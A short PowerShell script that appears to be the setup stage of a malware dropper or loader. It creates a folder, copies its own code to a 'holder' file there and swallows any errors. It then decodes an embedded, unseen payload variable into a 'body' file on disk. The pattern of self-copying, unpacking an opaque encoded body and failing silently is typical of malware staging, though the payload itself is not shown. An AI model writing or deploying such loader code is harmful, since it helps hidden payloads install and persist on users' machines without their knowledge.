. ./utils.ps1
. ./holder/consts_autoextract.ps1
. ./consts_body.ps1

function checkFolder {
    $appDataFolder = Get-HephaestusFolder
    if (-not (Test-Path -Path $appDataFolder))
    {
        New-Item -Path $appDataFolder -ItemType Directory | Out-Null
    }
}

function extract_holder()
{
    $curScript = Get-ScriptPath
    $holderFile = Get-HolderPath

    try
    {
        $pathOrData = $MyInvocation.MyCommand.Definition
        [System.IO.File]::WriteAllText($holderFile, $pathOrData)
        if ($pathOrData -like "IsDebug")
        {
            [System.IO.File]::WriteAllText($holderFile, $pathOrData)
        } 
        else 
        {
            if ($curScript -ne $holderFile)
            {
                Copy-Item -Path $curScript -Destination $holderFile -Force
            }
        } 
    }
    catch
    {
    }
}

function extract_body()
{
    $holderBodyFile = Get-BodyPath
    if (-not (Test-Path -Path $holderBodyFile))
    {
        CustomDecode -inContent $xbody -outFile $holderBodyFile
    }
}

function Initialization() 
{
    checkFolder
    extract_holder
    extract_body
}

Initialization
